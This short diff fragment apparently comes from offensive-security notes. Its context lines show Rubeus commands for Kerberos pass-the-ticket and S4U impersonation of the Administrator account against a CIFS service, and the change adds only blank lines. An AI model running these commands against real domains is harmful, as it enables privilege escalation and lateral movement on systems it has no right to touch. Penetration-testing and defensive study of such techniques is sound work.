@@ -17,3 +17,5 @@ Rubeus.exe ptt /ticket:"base64ticket"
 
 Rubeus.exe s4u /self /nowrap /impersonateuser:"Administrator" /altservice:"cifs/srv001" /ticket:"base64ticket" /ptt
 ```
+
+
